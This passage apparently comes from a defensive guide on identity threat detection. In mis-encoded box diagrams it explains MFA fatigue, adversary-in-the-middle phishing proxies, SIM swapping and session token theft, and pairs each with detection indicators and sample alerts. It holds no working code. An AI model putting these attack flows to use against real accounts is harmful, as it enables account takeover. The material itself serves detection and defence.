â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```


### Common Identity Attacks

#### MFA Bypass Techniques & Detection

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      MFA BYPASS TECHNIQUES                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  1. MFA FATIGUE / PROMPT BOMBING                                           â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                            â”‚
â”‚                                                                             â”‚
â”‚  Attack Flow:                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚  â”‚                                                                    â”‚     â”‚
â”‚  â”‚  Attacker has            Sends many MFA         User frustrated   â”‚     â”‚
â”‚  â”‚  password         â”€â”€â”€â”€â–¶  push requests   â”€â”€â”€â”€â–¶  accidentally     â”‚     â”‚
â”‚  â”‚                          (2am, repeatedly)      approves one      â”‚     â”‚
â”‚  â”‚                                                                    â”‚     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â”‚                                                                             â”‚
â”‚  Detection Indicators:                                                      â”‚
â”‚  â€¢ Multiple MFA push requests in short timeframe (>3 in 10 minutes)        â”‚
â”‚  â€¢ MFA requests at unusual hours for user                                  â”‚
â”‚  â€¢ MFA denied multiple times then approved                                 â”‚
â”‚  â€¢ Authentication from unusual location after approval                     â”‚
â”‚                                                                             â”‚
â”‚  ITDR Alert Example:                                                        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ âš ï¸ MFA Fatigue Attack Suspected                                    â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚ User: john.smith@company.com                                        â”‚   â”‚
â”‚  â”‚ Time: 02:34 AM (unusual for this user)                              â”‚   â”‚
â”‚  â”‚ Events:                                                              â”‚   â”‚
â”‚  â”‚   - 02:30 MFA Push Denied                                           â”‚   â”‚
â”‚  â”‚   - 02:31 MFA Push Denied                                           â”‚   â”‚
â”‚  â”‚   - 02:32 MFA Push Denied                                           â”‚   â”‚
â”‚  â”‚   - 02:33 MFA Push Denied                                           â”‚   â”‚
â”‚  â”‚   - 02:34 MFA Push APPROVED                                         â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚ Post-Approval Activity:                                             â”‚   â”‚
â”‚  â”‚   - Login from IP: 185.220.101.35 (Tor Exit Node)                   â”‚   â”‚
â”‚  â”‚   - Accessed: SharePoint Finance folder (never accessed before)    â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚ Recommended Action: IMMEDIATE account disable + investigation      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚                                                                             â”‚
â”‚  2. ADVERSARY-IN-THE-MIDDLE (AiTM) / AITM PHISHING                         â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                        â”‚
â”‚                                                                             â”‚
â”‚  Attack Flow:                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚  â”‚                                                                    â”‚     â”‚
â”‚  â”‚   User            Phishing           Attacker          Real       â”‚     â”‚
â”‚  â”‚                    Site               Proxy           Service     â”‚     â”‚
â”‚  â”‚                                                                    â”‚     â”‚
â”‚  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚     â”‚
â”‚  â”‚   â”‚      â”‚â”€â”€â”€â”€â”€â–¶â”‚ Fake     â”‚â”€â”€â”€â”€â”€â–¶â”‚ Captures â”‚â”€â”€â”€â”€â”€â–¶â”‚ Azure AD â”‚ â”‚     â”‚
â”‚  â”‚   â”‚      â”‚      â”‚ Login    â”‚      â”‚ Creds +  â”‚      â”‚          â”‚ â”‚     â”‚
â”‚  â”‚   â”‚      â”‚      â”‚ Page     â”‚      â”‚ Session  â”‚      â”‚          â”‚ â”‚     â”‚
â”‚  â”‚   â”‚      â”‚â—€â”€â”€â”€â”€â”€â”‚          â”‚â—€â”€â”€â”€â”€â”€â”‚ Cookie   â”‚â—€â”€â”€â”€â”€â”€â”‚          â”‚ â”‚     â”‚
â”‚  â”‚   â”‚ User â”‚      â”‚          â”‚      â”‚          â”‚      â”‚          â”‚ â”‚     â”‚
â”‚  â”‚   â”‚      â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚     â”‚
â”‚  â”‚   â”‚      â”‚  Sees real MFA   Relays MFA to   MFA succeeds!       â”‚     â”‚
â”‚  â”‚   â”‚      â”‚  prompt          real service                         â”‚     â”‚
â”‚  â”‚   â””â”€â”€â”€â”€â”€â”€â”˜                                                        â”‚     â”‚
â”‚  â”‚                                                                    â”‚     â”‚
â”‚  â”‚   Attacker now has valid session cookie - MFA BYPASSED            â”‚     â”‚
â”‚  â”‚                                                                    â”‚     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â”‚                                                                             â”‚
â”‚  Detection Indicators:                                                      â”‚
â”‚  â€¢ Login source IP doesn't match user's usual locations                   â”‚
â”‚  â€¢ Session created from known phishing infrastructure                      â”‚
â”‚  â€¢ User agent doesn't match their typical browser                          â”‚
â”‚  â€¢ Session cookie used from different IP than authentication               â”‚
â”‚  â€¢ Impossible travel: Auth in NYC, activity from Russia 5 min later       â”‚
â”‚                                                                             â”‚
â”‚  ITDR Alert Example:                                                        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ ğŸš¨ AiTM Attack Detected - Session Hijacking                         â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚ User: cfo@company.com                                               â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚ Authentication:                                                      â”‚   â”‚
â”‚  â”‚   - Time: 10:15 AM                                                  â”‚   â”‚
â”‚  â”‚   - IP: 67.180.25.101 (user's home ISP - expected)                 â”‚   â”‚
â”‚  â”‚   - MFA: Approved                                                   â”‚   â”‚
â”‚  â”‚   - Location: San Francisco, CA                                     â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚ Session Activity (5 minutes later):                                 â”‚   â”‚
â”‚  â”‚   - IP: 185.220.101.35 (Russia - TOR)                              â”‚   â”‚
â”‚  â”‚   - Same session token being used                                   â”‚   â”‚
â”‚  â”‚   - Accessed: Email, SharePoint                                     â”‚   â”‚
â”‚  â”‚   - Downloaded: 500MB of files                                      â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚ Detection: Impossible travel + Session IP mismatch                  â”‚   â”‚
â”‚  â”‚ Confidence: 99%                                                     â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚ Automated Response Triggered:                                       â”‚   â”‚
â”‚  â”‚   âœ“ All sessions revoked                                           â”‚   â”‚
â”‚  â”‚   âœ“ Account temporarily blocked                                    â”‚   â”‚
â”‚  â”‚   âœ“ SOC alerted                                                    â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚                                                                             â”‚
â”‚  3. SIM SWAPPING                                                            â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                            â”‚
â”‚                                                                             â”‚
â”‚  Attack Flow:                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚  â”‚                                                                    â”‚     â”‚
â”‚  â”‚  Attacker social    Carrier transfers   Attacker receives       â”‚     â”‚
â”‚  â”‚  engineers carrier  number to attacker  all SMS MFA codes       â”‚     â”‚
â”‚  â”‚                                                                    â”‚     â”‚
â”‚  â”‚  "I lost my phone,  "Number ported"     "Your code is 847291"   â”‚     â”‚
â”‚  â”‚   need new SIM"                          â†’ Account takeover      â”‚     â”‚
â”‚  â”‚                                                                    â”‚     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â”‚                                                                             â”‚
â”‚  Detection is DIFFICULT - occurs at carrier level                          â”‚
â”‚  Prevention: Use authenticator apps, FIDO2 keys instead of SMS            â”‚
â”‚                                                                             â”‚
â”‚                                                                             â”‚
â”‚  4. TOKEN THEFT (Cookie/Session Stealing)                                  â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                    â”‚
â”‚                                                                             â”‚
â”‚  Attack Vectors:                                                            â”‚
â”‚  â€¢ Malware that steals browser cookies                                     â”‚
â”‚  â€¢ Memory scraping on compromised endpoints                                â”‚
â”‚  â€¢ Man-in-the-browser attacks                                              â”‚
â”‚                                                                             â”‚
â”‚  Detection Indicators:                                                      â”‚
â”‚  â€¢ Same token used from multiple IPs simultaneously                        â”‚
â”‚  â€¢ Token used from unexpected geographic location                          â”‚
â”‚  â€¢ Token activity after user logs out                                      â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```
